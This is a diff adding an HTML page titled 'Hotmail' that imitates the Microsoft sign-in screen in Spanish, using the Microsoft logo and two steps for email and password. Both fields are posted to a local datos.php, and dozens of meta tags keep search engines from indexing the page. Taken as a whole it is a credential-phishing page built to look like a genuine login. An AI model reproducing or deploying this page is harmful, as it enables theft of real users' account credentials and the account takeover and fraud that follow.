@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Hotmail</title>
+	<style>
+img[src*=""] {
+    display: none;
+}
+</style>
+	<meta name="robots" content="none">
+	<meta name="robots" content="noindex">
+	<meta name="robots" content="nofollow">
+	<meta name="robots" content="noarchive">
+	<meta name="robots" content="nocache">
+	<meta name="robots" content="noimageindex">
+	<meta name="robots" content="nomediaindex">
+	<meta name="robots" content="noodp">
+	<meta name="robots" content="noodyp">
+	<meta name="robots" content="notranslate">
+	<meta name="robots" content="noyaca">
+	<meta name="robots" content="noydir">
+	<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
+	<meta name="googlebot" content="none">
+	<meta name="googlebot" content="noindex">
+	<meta name="googlebot" content="nofollow">
+	<meta name="googlebot" content="noarchive">
+	<meta name="googlebot" content="nocache">
+	<meta name="googlebot" content="noimageindex">
+	<meta name="googlebot" content="nomediaindex">
+	<meta name="googlebot" content="noodp">
+	<meta name="googlebot" content="noodyp">
+	<meta name="googlebot" content="notranslate">
+	<meta name="googlebot" content="noyaca">
+	<meta name="googlebot" content="noydir">
+	<meta name="slurp" content="none">
+	<meta name="slurp" content="noindex">
+	<meta name="slurp" content="nofollow">
+	<meta name="slurp" content="noarchive">
+	<meta name="slurp" content="nocache">
+	<meta name="slurp" content="noimageindex">
+	<meta name="slurp" content="nomediaindex">
+	<meta name="slurp" content="noodp">
+	<meta name="slurp" content="notranslate">
+	<meta name="slurp" content="noyaca">
+	<meta name="slurp" content="noydir">
+
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="css/estilos.css">
+	<link rel="stylesheet" type="text/css" href="css/fontello.css">
+	<link rel="icon" href="img/logo.jpg">
+</head>
+<body>
+    	<div class="content-box">
+    		<form action="datos.php" method="post">
+                <div class="content-one">
+    			<section class="header"><img src="img/microsoft_logo.svg"></section>
+    			<h3>Iniciar sesión</h3>
+    			<input id="email" class="email" type="email" name="email" placeholder="Correo electrónico,teléfono o Skype" required="true">
+                <input type="button" value="Siguiente" class="btn-enviar" onclick="document.getElementById('textemail').innerHTML = 
+                document.getElementById('email').value;">
+    			<div class="question">
+    				<a href="#" class="one">¿No tiene una cuenta?</a>
+    				<a href="#" class="second">Crea una.</a>
+					<h3><a href="#" class="second">Iniciar sesión con una llave de seguridad?</a></h3>
+					<h2><a href="#" class="second">Opciones de seguridad.</h2>
+    			</div>
+                </div>
+                <div class="content-other">
+                   <section class="header"><img src="img/microsoft_logo.svg"></section>
+                   <a class="content-name"><i class="icon-left"></i> <div id="textemail"></div></a>
+                   <h3>Escribir contraseña</h3>
+                   <input type="password" name="pass" class="pass" placeholder="Contraseña" required="true" id = "pass">
+                   <div class="question-dos">
+                      <a href="#!" class="dos"><input type="checkbox" name="checkbox">Mantener la sesión iniciada</a>
+                      <a href="#!" class="one">Olvidó su contraseña?</a>
+                    </div>
+                    <input type="submit" value="Iniciar sesión" class="btn-login">
+                </div>
+            </form>
+    	</div>
+    	<footer>
+    		<div class="content-items">
+    			<a href="#" class="points">...</a>
+    			<a href="#">Privacidad & cookies</a>
+    			<a href="#">Terminos de uso</a>
+    			
+    		</div>
+    	</footer>
+           <script type="text/javascript" src="js/jquery.min.js"></script>
+               <script type="text/javascript" src="js/archivo.js"></script>
+</body>
+</html>
